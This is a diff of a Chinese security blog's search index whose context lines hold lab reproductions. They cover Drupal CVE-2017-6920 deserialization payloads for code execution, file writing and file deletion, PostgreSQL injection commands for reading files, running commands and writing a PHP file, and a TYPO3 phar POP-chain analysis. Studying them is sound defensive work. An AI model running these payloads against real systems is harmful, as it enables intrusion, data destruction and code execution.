@@ -40,13 +40,11 @@
     <title>Drupal 8.3.3 CVE-2017-6920调试复现</title>
     <url>/2019/06/11/Drupal-8-3-3-CVE-2017-6920%E8%B0%83%E8%AF%95%E5%A4%8D%E7%8E%B0/</url>
     <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>本次复现调试环境为<code>ubuntu 16.04</code>和<code>php5.4</code>。在这里出现一个小插曲。本次漏洞触发需要用到<code>yaml</code>，环境配置的时候编译安装<code>yaml</code>出现错误。最后莫名其妙采用<code>apt-get install php-yaml</code>安装成功。修改<code>php.ini</code>中的<code>extension_dir</code>为该扩展所在目录，然后加上<code>extension=yaml.so</code>就可以了。最后重启apache，看到<code>phpinfo</code>中有<code>yaml</code>扩展，就说明安装成功，如下图：</p>
-<img src="/2019/06/11/Drupal-8-3-3-CVE-2017-6920%E8%B0%83%E8%AF%95%E5%A4%8D%E7%8E%B0/06/11/Drupal-8-3-3-CVE-2017-6920%E8%B0%83%E8%AF%95%E5%A4%8D%E7%8E%B0/yaml.png" class>
-
+<p><img src="/2019/06/11/Drupal-8-3-3-CVE-2017-6920%E8%B0%83%E8%AF%95%E5%A4%8D%E7%8E%B0/yaml.png" alt="label"></p>
 <p>还有在用<code>phpstorm</code>调试漏洞的时候，发现几个利用到的文件都不存在。后来发现我采用的远程调试，服务器端使用<code>composer install</code>安装了需要的包，但是<code>phpstorm</code>中使用的是下载下来的<code>drupal 8.3.3</code>源码，没有包含需要用到的包。在本地<code>drupal 8.3.3</code>源码包中执行<code>composer install</code>即可。总结一条小经验，<strong>后续在源码审计的时候，先不管三七二十一，执行<code>composer install</code>安装依赖包</strong>。</p>
 <h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>2017年6月21日，Drupal官方发布了一个编号为CVE-2017- 6920 的漏洞，影响为Critical。这是Drupal Core的YAML解析器处理不当所导致的一个远程代码执行漏洞，影响8.x的Drupal Core。漏洞触发需要登录后台。</p>
 <h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>通过diff 8.3.3与8.3.4的文件可以发现漏洞的触发点，主要修改点在<code>core/lib/Drupal/Component/Serialization/YamlPecl.php</code>文件<code>decode</code>方法如下图：</p>
-<img src="/2019/06/11/Drupal-8-3-3-CVE-2017-6920%E8%B0%83%E8%AF%95%E5%A4%8D%E7%8E%B0/06/11/Drupal-8-3-3-CVE-2017-6920%E8%B0%83%E8%AF%95%E5%A4%8D%E7%8E%B0/drupal01.png" class>
-
+<p><img src="/2019/06/11/Drupal-8-3-3-CVE-2017-6920%E8%B0%83%E8%AF%95%E5%A4%8D%E7%8E%B0/drupal01.png" alt="label"></p>
 <p>可见在<code>yaml_parse</code>前进行了<code>ini_set(&#39;yaml.decode_php&#39;, 0);</code></p>
 <p>用户可控制的参数<code>$raw</code>直接传给了<code>yaml_parse</code>函数，而在手册上关于<code>yaml_parse</code>函数有这么一个注意点：</p>
 <blockquote>
@@ -55,45 +53,28 @@
 </blockquote>
 <p>也就是说，如果使用了<code>yaml</code>标志<code>!php/object</code>，那么这个内容会通过<code>unserialize()</code>进行处理，设置<code>yaml.decode_php</code>则可以禁止，这就是为什么补丁增加了这行代码。</p>
 <p>看一下调用<code>decode()</code>方法的地方，<code>core/lib/Drupal/Component/Serialization/Yaml.php</code>：</p>
-<img src="/2019/06/11/Drupal-8-3-3-CVE-2017-6920%E8%B0%83%E8%AF%95%E5%A4%8D%E7%8E%B0/06/11/Drupal-8-3-3-CVE-2017-6920%E8%B0%83%E8%AF%95%E5%A4%8D%E7%8E%B0/drupal02.png" class>
-
-<p>在<code>Yaml</code>类的<code>decode()</code>方法调用了<code>static::getSerializer()</code>方法，跟入</p>
-<img src="/2019/06/11/Drupal-8-3-3-CVE-2017-6920%E8%B0%83%E8%AF%95%E5%A4%8D%E7%8E%B0/06/11/Drupal-8-3-3-CVE-2017-6920%E8%B0%83%E8%AF%95%E5%A4%8D%E7%8E%B0/drupal3.png" class>
-
-<p>可以看到加载了<code>yaml</code>扩展后就会进入<code>YamlPecl</code>类，进而调用<code>Yaml::decode()</code>方法，搜索调用<code>Yaml::decode</code>并且参数能被控制的地方，在<code>core/modules/config/src/Form/ConfigSingleImportForm.php</code>的<code>validateForm()</code>方法：</p>
+<p><img src="/2019/06/11/Drupal-8-3-3-CVE-2017-6920%E8%B0%83%E8%AF%95%E5%A4%8D%E7%8E%B0/drupal02.png" alt="label">)在<code>Yaml</code>类的<code>decode()</code>方法调用了<code>static::getSerializer()</code>方法，跟入</p>
+<p><img src="/2019/06/11/Drupal-8-3-3-CVE-2017-6920%E8%B0%83%E8%AF%95%E5%A4%8D%E7%8E%B0/drupal3.png" alt="label">)可以看到加载了<code>yaml</code>扩展后就会进入<code>YamlPecl</code>类，进而调用<code>Yaml::decode()</code>方法，搜索调用<code>Yaml::decode</code>并且参数能被控制的地方，在<code>core/modules/config/src/Form/ConfigSingleImportForm.php</code>的<code>validateForm()</code>方法：</p>
 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$data = Yaml::decode($form_state-&gt;getValue(<span class="string">'import'</span>));</span><br></pre></td></tr></table></figure>
 
 <p><code>validateForm()</code>的调用处在<code>http://172.16.26.132/drupal/admin/config/development/configuration/single/import</code>，<code>decode()</code>的参数直接从表单获取，于是通过<code>import</code>将恶意参数传递进去。</p>
 <p>要利用该漏洞进行远程代码执行，需要一个可以利用的类。<code>Drupal</code>使用命名空间的方式来管理类，可以全局实例化一个类，也可以反序列化一个类；该漏洞利用了反序列，因此需要找一个反序列类。通过<code>_destruct</code>以及<code>_wakeup</code>来定位类，全局搜索可以找到几个可利用的类。</p>
 <p>（1）<code>/vendor/symfony/process/Pipes/WindowsPipes.php</code>中的89行：</p>
-<img src="/2019/06/11/Drupal-8-3-3-CVE-2017-6920%E8%B0%83%E8%AF%95%E5%A4%8D%E7%8E%B0/06/11/Drupal-8-3-3-CVE-2017-6920%E8%B0%83%E8%AF%95%E5%A4%8D%E7%8E%B0/drupal04.png" class>
-
-<p>通过反序列化这个类可以造成一个任意文件删除</p>
+<p><img src="/2019/06/11/Drupal-8-3-3-CVE-2017-6920%E8%B0%83%E8%AF%95%E5%A4%8D%E7%8E%B0/drupal04.png" alt="label">通过反序列化这个类可以造成一个任意文件删除</p>
 <p>（2）<code>/vendor/guzzlehttp/guzzle/src/Cookie/FileCookieJar.php</code>中第37行：</p>
-<img src="/2019/06/11/Drupal-8-3-3-CVE-2017-6920%E8%B0%83%E8%AF%95%E5%A4%8D%E7%8E%B0/06/11/Drupal-8-3-3-CVE-2017-6920%E8%B0%83%E8%AF%95%E5%A4%8D%E7%8E%B0/drupal05.png" class>
-
-<p>通过反序列化这个类可以造成写入webshell。</p>
+<p><img src="/2019/06/11/Drupal-8-3-3-CVE-2017-6920%E8%B0%83%E8%AF%95%E5%A4%8D%E7%8E%B0/drupal05.png" alt="label">通过反序列化这个类可以造成写入webshell。</p>
 <p>（3）<code>/vendor/guzzlehttp/psr7/src/FnStream.php</code>中第48行：</p>
-<img src="/2019/06/11/Drupal-8-3-3-CVE-2017-6920%E8%B0%83%E8%AF%95%E5%A4%8D%E7%8E%B0/06/11/Drupal-8-3-3-CVE-2017-6920%E8%B0%83%E8%AF%95%E5%A4%8D%E7%8E%B0/drupal6.png" class>
-
-<p>通过反序列化这个类可以造成任意无参数函数执行。</p>
+<p><img src="/2019/06/11/Drupal-8-3-3-CVE-2017-6920%E8%B0%83%E8%AF%95%E5%A4%8D%E7%8E%B0/drupal6.png" alt="label">通过反序列化这个类可以造成任意无参数函数执行。</p>
 <h2 id="漏洞验证"><a href="#漏洞验证" class="headerlink" title="漏洞验证"></a>漏洞验证</h2><h3 id="1-远程代码执行"><a href="#1-远程代码执行" class="headerlink" title="1.远程代码执行"></a>1.远程代码执行</h3><p>利用<code>phpggc</code>生成序列化数据：</p>
-<img src="/2019/06/11/Drupal-8-3-3-CVE-2017-6920%E8%B0%83%E8%AF%95%E5%A4%8D%E7%8E%B0/06/11/Drupal-8-3-3-CVE-2017-6920%E8%B0%83%E8%AF%95%E5%A4%8D%E7%8E%B0/drupal06.png" class>
-
-<p>注意序列化数据中的空字符，需要转换。在这里先把序列化的数据保存到文件，然后利用<code>addslashes</code>来转换字符。接着拼接<code>YAML_PHP_TAG</code>即<code>!php/object</code>,最终生成的字符串如下：</p>
+<p><img src="/2019/06/11/Drupal-8-3-3-CVE-2017-6920%E8%B0%83%E8%AF%95%E5%A4%8D%E7%8E%B0/drupal06.png" alt="label">注意序列化数据中的空字符，需要转换。在这里先把序列化的数据保存到文件，然后利用<code>addslashes</code>来转换字符。接着拼接<code>YAML_PHP_TAG</code>即<code>!php/object</code>,最终生成的字符串如下：</p>
 <figure class="highlight"><table><tr><td class="code"><pre><span class="line">!php/object "O:24:\"GuzzleHttp\\Psr7\\FnStream\":2:&#123;s:33:\"\0GuzzleHttp\\Psr7\\FnStream\0methods\";a:1:&#123;s:5:\"close\";a:2:&#123;i:0;O:23:\"GuzzleHttp\\HandlerStack\":3:&#123;s:32:\"\0GuzzleHttp\\HandlerStack\0handler\";s:1:\"1\";s:30:\"\0GuzzleHttp\\HandlerStack\0stack\";a:1:&#123;i:0;a:1:&#123;i:0;s:7:\"phpinfo\";&#125;&#125;s:31:\"\0GuzzleHttp\\HandlerStack\0cached\";b:0;&#125;i:1;s:7:\"resolve\";&#125;&#125;s:9:\"_fn_close\";a:2:&#123;i:0;r:4;i:1;s:7:\"resolve\";&#125;&#125;"</span><br></pre></td></tr></table></figure>
 
 <p>在<code>http://172.16.26.132/drupal/admin/config/development/configuration/single/import</code> import 序列化后的数据，便可以执行代码</p>
-<img src="/2019/06/11/Drupal-8-3-3-CVE-2017-6920%E8%B0%83%E8%AF%95%E5%A4%8D%E7%8E%B0/06/11/Drupal-8-3-3-CVE-2017-6920%E8%B0%83%E8%AF%95%E5%A4%8D%E7%8E%B0/drupal07.png" class>
-
-<p>执行结果如下：</p>
-<img src="/2019/06/11/Drupal-8-3-3-CVE-2017-6920%E8%B0%83%E8%AF%95%E5%A4%8D%E7%8E%B0/06/11/Drupal-8-3-3-CVE-2017-6920%E8%B0%83%E8%AF%95%E5%A4%8D%E7%8E%B0/drupal08.png" class>
-
+<p><img src="/2019/06/11/Drupal-8-3-3-CVE-2017-6920%E8%B0%83%E8%AF%95%E5%A4%8D%E7%8E%B0/drupal07.png" alt="label">执行结果如下：</p>
+<p><img src="/2019/06/11/Drupal-8-3-3-CVE-2017-6920%E8%B0%83%E8%AF%95%E5%A4%8D%E7%8E%B0/drupal08.png" alt="label"></p>
 <h3 id="2-任意文件写入"><a href="#2-任意文件写入" class="headerlink" title="2.任意文件写入"></a>2.任意文件写入</h3><p>看一下<code>phpggc</code>中有关<code>FileCookieJar</code>类的部分</p>
-<img src="/2019/06/11/Drupal-8-3-3-CVE-2017-6920%E8%B0%83%E8%AF%95%E5%A4%8D%E7%8E%B0/06/11/Drupal-8-3-3-CVE-2017-6920%E8%B0%83%E8%AF%95%E5%A4%8D%E7%8E%B0/drupal09.png" class>
-
-<img src="/2019/06/11/Drupal-8-3-3-CVE-2017-6920%E8%B0%83%E8%AF%95%E5%A4%8D%E7%8E%B0/06/11/Drupal-8-3-3-CVE-2017-6920%E8%B0%83%E8%AF%95%E5%A4%8D%E7%8E%B0/drupal10.png" class>
-
+<p><img src="/2019/06/11/Drupal-8-3-3-CVE-2017-6920%E8%B0%83%E8%AF%95%E5%A4%8D%E7%8E%B0/drupal09.png" alt="label"></p>
+<p><img src="/2019/06/11/Drupal-8-3-3-CVE-2017-6920%E8%B0%83%E8%AF%95%E5%A4%8D%E7%8E%B0/drupal10.png" alt="label"></p>
 <p>转义拼接之后，最后生成的字符串如下：</p>
 <figure class="highlight"><table><tr><td class="code"><pre><span class="line">!php/object "O:31:\"GuzzleHttp\\Cookie\\FileCookieJar\":4:&#123;s:41:\"\0GuzzleHttp\\Cookie\\FileCookieJar\0filename\";s:34:\"/var/www/htdocs/drupal/phpinfo.php\";s:52:\"\0GuzzleHttp\\Cookie\\FileCookieJar\0storeSessionCookies\";b:1;s:36:\"\0GuzzleHttp\\Cookie\\CookieJar\0cookies\";a:1:&#123;i:0;O:27:\"GuzzleHttp\\Cookie\\SetCookie\":1:&#123;s:33:\"\0GuzzleHttp\\Cookie\\SetCookie\0data\";a:3:&#123;s:7:\"Expires\";i:1;s:7:\"Discard\";b:0;s:5:\"Value\";s:20:\"&lt;?php phpinfo(); ?&gt;</span><br><span class="line">\";&#125;&#125;&#125;s:39:\"\0GuzzleHttp\\Cookie\\CookieJar\0strictMode\";N;&#125;"</span><br></pre></td></tr></table></figure>
 
@@ -109,9 +90,7 @@
 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Symfony</span>\<span class="title">Component</span>\<span class="title">Process</span>\<span class="title">Pipes</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">WindowsPipes</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $files = <span class="keyword">array</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($input)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;files = <span class="keyword">array</span>($input);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <p>我们直接生成<code>WindowsPipes</code>的序列化数据，把文件名作为参数传入，在反序列化的时候自动调用<code>removeFiles()</code>，实现任意文件删除。</p>
-<img src="/2019/06/11/Drupal-8-3-3-CVE-2017-6920%E8%B0%83%E8%AF%95%E5%A4%8D%E7%8E%B0/06/11/Drupal-8-3-3-CVE-2017-6920%E8%B0%83%E8%AF%95%E5%A4%8D%E7%8E%B0/drupal12.png" class>
-
-<p>转移拼接之后，最后生成的字符串如下：</p>
+<p><img src="/2019/06/11/Drupal-8-3-3-CVE-2017-6920%E8%B0%83%E8%AF%95%E5%A4%8D%E7%8E%B0/drupal12.png" alt="label">转移拼接之后，最后生成的字符串如下：</p>
 <figure class="highlight"><table><tr><td class="code"><pre><span class="line">!php/object "O:44:\"Symfony\\Component\\Process\\Pipes\\WindowsPipes\":1:&#123;s:51:\"\0Symfony\\Component\\Process\\Pipes\\WindowsPipes\0files\";a:1:&#123;i:0;s:34:\"/var/www/htdocs/drupal/phpinfo.php\";&#125;&#125;"</span><br></pre></td></tr></table></figure>
 
 <p><code>import</code>之后，发现目录下的<code>phpinfo.php</code>已经被删除了。</p>
@@ -213,33 +192,27 @@
 <p><strong>查看版本信息</strong></p>
 <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">version</span>();</span><br></pre></td></tr></table></figure>
 
-<img src="/2021/06/05/PostgreSQL%E6%B3%A8%E5%85%A5%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/06/05/PostgreSQL%E6%B3%A8%E5%85%A5%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/version.png" class>
-
+<p><img src="/2021/06/05/PostgreSQL%E6%B3%A8%E5%85%A5%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/version.png" alt="label"></p>
 <p><strong>查看当前用户</strong></p>
 <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">current_user</span>;</span><br></pre></td></tr></table></figure>
 
-<img src="/2021/06/05/PostgreSQL%E6%B3%A8%E5%85%A5%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/06/05/PostgreSQL%E6%B3%A8%E5%85%A5%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/current_user.png" class>
-
+<p><img src="/2021/06/05/PostgreSQL%E6%B3%A8%E5%85%A5%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/current_user.png" alt="label"></p>
 <p><strong>查看启动该sesson的用户</strong></p>
 <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">session_user</span>;</span><br></pre></td></tr></table></figure>
 
-<img src="/2021/06/05/PostgreSQL%E6%B3%A8%E5%85%A5%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/06/05/PostgreSQL%E6%B3%A8%E5%85%A5%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/session_user.png" class>
-
+<p><img src="/2021/06/05/PostgreSQL%E6%B3%A8%E5%85%A5%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/session_user.png" alt="label"></p>
 <p><strong>查看当前数据库</strong></p>
 <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> current_database();</span><br></pre></td></tr></table></figure>
 
-<img src="/2021/06/05/PostgreSQL%E6%B3%A8%E5%85%A5%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/06/05/PostgreSQL%E6%B3%A8%E5%85%A5%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/current_database.png" class>
-
+<p><img src="/2021/06/05/PostgreSQL%E6%B3%A8%E5%85%A5%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/current_database.png" alt="label"></p>
 <p><strong>PostgreSQL下的IF</strong></p>
 <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">CASE </span><br><span class="line">      WHEN condition_1  THEN result_1</span><br><span class="line">      WHEN condition_2  THEN result_2</span><br><span class="line">      [WHEN ...]</span><br><span class="line">      [ELSE else_result]</span><br><span class="line"><span class="keyword">END</span></span><br></pre></td></tr></table></figure>
 
-<img src="/2021/06/05/PostgreSQL%E6%B3%A8%E5%85%A5%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/06/05/PostgreSQL%E6%B3%A8%E5%85%A5%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/case_when.png" class>
-
+<p><img src="/2021/06/05/PostgreSQL%E6%B3%A8%E5%85%A5%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/case_when.png" alt="label"></p>
 <p><strong>读取文件</strong></p>
 <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> pg_read_file(filepath+filename);</span><br></pre></td></tr></table></figure>
 
-<img src="/2021/06/05/PostgreSQL%E6%B3%A8%E5%85%A5%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/06/05/PostgreSQL%E6%B3%A8%E5%85%A5%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/read_file.png" class>
-
+<p><img src="/2021/06/05/PostgreSQL%E6%B3%A8%E5%85%A5%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/read_file.png" alt="label"></p>
 <p><strong>执行命令</strong></p>
 <p> Postgresql 8.2以下的版本直接调用/lib/libc.so.6或者/lib64/libc.so.6，可以执行命令：</p>
 <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">function</span> <span class="keyword">system</span>(cstring) <span class="keyword">returns</span> <span class="built_in">int</span> <span class="keyword">AS</span> <span class="string">'/lib/libc.so.6'</span>, <span class="string">'system'</span> <span class="keyword">language</span> C <span class="keyword">strict</span>;</span><br><span class="line"><span class="keyword">create</span> <span class="keyword">function</span> <span class="keyword">system</span>(cstring) <span class="keyword">returns</span> <span class="built_in">int</span> <span class="keyword">AS</span> <span class="string">'/lib64/libc.so.6'</span>, <span class="string">'system'</span> <span class="keyword">language</span> C <span class="keyword">strict</span>;</span><br><span class="line"><span class="keyword">select</span> <span class="keyword">system</span>(<span class="string">'id'</span>);</span><br></pre></td></tr></table></figure>
@@ -249,8 +222,7 @@
 <p><strong>写入文件</strong></p>
 <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">COPY (<span class="keyword">select</span> <span class="string">'&lt;?php phpinfo();?&gt;'</span>) <span class="keyword">to</span> <span class="string">'/tmp/1.php'</span>;</span><br></pre></td></tr></table></figure>
 
-<img src="/2021/06/05/PostgreSQL%E6%B3%A8%E5%85%A5%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/06/05/PostgreSQL%E6%B3%A8%E5%85%A5%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/save.png" class>
-
+<p><img src="/2021/06/05/PostgreSQL%E6%B3%A8%E5%85%A5%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/save.png" alt="label"></p>
 <p><strong>参考文章：</strong></p>
 <p><a href="https://docs.ioin.in/writeup/www.jianfensec.com/_postgresql_getshell_html/index.html" target="_blank" rel="noopener">postgresql高版本UDF提权技巧</a></p>
 <p><a href="http://drops.xmd5.com/static/drops/tips-6449.html" target="_blank" rel="noopener">Hacking PostgreSQL</a></p>
@@ -282,19 +254,15 @@
 
 <p>好了，现在开始进行漏洞分析。</p>
 <p>TYPO3中存在漏洞的代码在<code>typo3/sysext/core/Classes/Database/SoftReferenceIndex.php</code>的<code>getTypoLinkParts()</code>方法</p>
-<img src="/2018/06/12/TYPO3-CORE-SA-2018-002-RCE%E5%88%86%E6%9E%90/06/12/TYPO3-CORE-SA-2018-002-RCE%E5%88%86%E6%9E%90/file_exitst.png" class>
-
+<p><img src="/2018/06/12/TYPO3-CORE-SA-2018-002-RCE%E5%88%86%E6%9E%90/file_exitst.png" alt="label"></p>
 <p>上面说到存在风险的文件操作函数，其中就包括<code>file_exists()</code>，当传给<code>file_exists()</code>的参数是<code>phar</code>压缩文档并通过<code>phar://</code>伪协议解析时，就会反序列化其中的<code>metadata</code>数据，一旦该数据被控制，就会形成漏洞。</p>
 <p>我们可以构造<code>$splitLinkParam</code>参数为<code>phar</code>文件，其中包含恶意代码，传递给<code>file_exists()</code>函数，便会触发漏洞。</p>
 <p>在这里，利用<code>phpggc</code>来构造POP链。TYPO3中包含类<code>FnStream</code>,所以可以利用<code>phpggc</code>中的<code>guzzle/rce1</code>载荷将数据写入一张图片中。</p>
-<img src="/2018/06/12/TYPO3-CORE-SA-2018-002-RCE%E5%88%86%E6%9E%90/06/12/TYPO3-CORE-SA-2018-002-RCE%E5%88%86%E6%9E%90/phpggc.png" class>
-
+<p><img src="/2018/06/12/TYPO3-CORE-SA-2018-002-RCE%E5%88%86%E6%9E%90/phpggc.png" alt="label"></p>
 <p>然后上传这个附件，接着创建一个页面，将 Link 设置为<code>phar://</code>，注意需要将<code>:</code>转义</p>
-<img src="/2018/06/12/TYPO3-CORE-SA-2018-002-RCE%E5%88%86%E6%9E%90/06/12/TYPO3-CORE-SA-2018-002-RCE%E5%88%86%E6%9E%90/typo3_1.png" class>
-
+<p><img src="/2018/06/12/TYPO3-CORE-SA-2018-002-RCE%E5%88%86%E6%9E%90/typo3_1.png" alt="label"></p>
 <p>保存后就会触发漏洞</p>
-<img src="/2018/06/12/TYPO3-CORE-SA-2018-002-RCE%E5%88%86%E6%9E%90/06/12/TYPO3-CORE-SA-2018-002-RCE%E5%88%86%E6%9E%90/typo3_2.png" class>
-
+<p><img src="/2018/06/12/TYPO3-CORE-SA-2018-002-RCE%E5%88%86%E6%9E%90/typo3_2.png" alt="label"></p>
 <p>漏洞复现完毕。</p>
 <p>最后说一下<code>phpggc</code>中该POP调用链。</p>
 <p>在PHPGGC中，pop链在<code>gadgets.php</code>文件中，pop链的逻辑和描述在<code>chain.php</code>文件中<br><code>chain.php</code></p>
@@ -305,8 +273,7 @@
 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Psr</span>\<span class="title">Http</span>\<span class="title">Message</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="title">interface</span> <span class="title">StreamInterface</span>&#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title">namespace</span> <span class="title">GuzzleHttp</span>\<span class="title">Psr7</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="title">class</span> <span class="title">FnStream</span> <span class="title">implements</span> \<span class="title">Psr</span>\<span class="title">Http</span>\<span class="title">Message</span>\<span class="title">StreamInterface</span></span><br><span class="line">	&#123;</span><br><span class="line">	    <span class="title">private</span> $<span class="title">methods</span>;</span><br><span class="line"></span><br><span class="line">	    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">(array $methods)</span></span></span><br><span class="line"><span class="function">	    </span>&#123;</span><br><span class="line">	        <span class="keyword">$this</span>-&gt;methods = $methods;</span><br><span class="line"></span><br><span class="line">	        <span class="keyword">foreach</span> ($methods <span class="keyword">as</span> $name =&gt; $fn) &#123;</span><br><span class="line">	            <span class="keyword">$this</span>-&gt;&#123;<span class="string">'_fn_'</span> . $name&#125; = $fn;</span><br><span class="line">	        &#125;</span><br><span class="line">	    &#125;</span><br><span class="line"></span><br><span class="line">	    <span class="comment">/*</span></span><br><span class="line"><span class="comment">	    public function __destruct()</span></span><br><span class="line"><span class="comment">	    &#123;</span></span><br><span class="line"><span class="comment">	        if (isset($this-&gt;_fn_close)) &#123;</span></span><br><span class="line"><span class="comment">	            call_user_func($this-&gt;_fn_close);</span></span><br><span class="line"><span class="comment">	        &#125;</span></span><br><span class="line"><span class="comment">	    &#125;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	    public function close()</span></span><br><span class="line"><span class="comment">	    &#123;</span></span><br><span class="line"><span class="comment">	        return call_user_func($this-&gt;_fn_close);</span></span><br><span class="line"><span class="comment">	    &#125;</span></span><br><span class="line"><span class="comment">	    */</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">GuzzleHttp</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="title">class</span> <span class="title">HandlerStack</span></span><br><span class="line">	&#123;</span><br><span class="line">	    <span class="title">private</span> $<span class="title">handler</span>;</span><br><span class="line">	    <span class="keyword">private</span> $stack;</span><br><span class="line">	    <span class="keyword">private</span> $cached = <span class="keyword">false</span>;</span><br><span class="line"></span><br><span class="line">	    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($function, $parameter)</span></span></span><br><span class="line"><span class="function">	    </span>&#123;</span><br><span class="line">	    	<span class="keyword">$this</span>-&gt;stack = [[$function]];</span><br><span class="line">	    	<span class="keyword">$this</span>-&gt;handler = $parameter;</span><br><span class="line">	    &#125;</span><br><span class="line"></span><br><span class="line">	    <span class="comment">/*</span></span><br><span class="line"><span class="comment">	    public function resolve()</span></span><br><span class="line"><span class="comment">	    &#123;</span></span><br><span class="line"><span class="comment">	        if (!$this-&gt;cached) &#123;</span></span><br><span class="line"><span class="comment">	            if (!($prev = $this-&gt;handler)) &#123;</span></span><br><span class="line"><span class="comment">	                throw new \LogicException('No handler has been specified');</span></span><br><span class="line"><span class="comment">	            &#125;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	            foreach (array_reverse($this-&gt;stack) as $fn) &#123;</span></span><br><span class="line"><span class="comment">	                $prev = $fn[0]($prev);</span></span><br><span class="line"><span class="comment">	            &#125;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	            $this-&gt;cached = $prev;</span></span><br><span class="line"><span class="comment">	        &#125;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	        return $this-&gt;cached;</span></span><br><span class="line"><span class="comment">	    &#125;</span></span><br><span class="line"><span class="comment">	    */</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <p>在类HandlerStack的构造方法中传入了rce要使用的函数及参数，并赋值给<code>$this-&gt;stack</code>和<code>$this-&gt;handler</code>，然后在类<code>FnStream</code>的构造方法中传入包含键<code>close</code>的数组，此时将会拼接出:<code>_fn_close=[new\GuzzleHttp\HandlerStack($function, $parameter),&#39;resolve&#39;]</code><br><code>_fn_close</code>的第一个元素其实已经实例化为一个匿名对象了，这里为了好理解先写成实例化前的形式。然后在FnStream的<code>__destruct()</code>函数中将会调用<code>$this-&gt;_fn_close</code>，即构成：<br><code>call_user_func([new \GuzzleHttp\HandlerStack($function, $parameter),&#39;resolve&#39;])</code><br>以上这种调用的形式在php官方文档中存在此种调用类中方法的形式：</p>
-<img src="/2018/06/12/TYPO3-CORE-SA-2018-002-RCE%E5%88%86%E6%9E%90/06/12/TYPO3-CORE-SA-2018-002-RCE%E5%88%86%E6%9E%90/call_user_func.png" class>
-
+<p><img src="/2018/06/12/TYPO3-CORE-SA-2018-002-RCE%E5%88%86%E6%9E%90/call_user_func.png" alt="label"></p>
 <p>所以此时关注类<code>HandlerStack</code>的<code>resolve</code>方法,其中将利用php的动态函数的性质来构成rce的函数调用，比如此时假设：<br><code>[new \GuzzleHttp\HandlerStack($function, $parameter),&#39;resolve&#39;]=&gt;
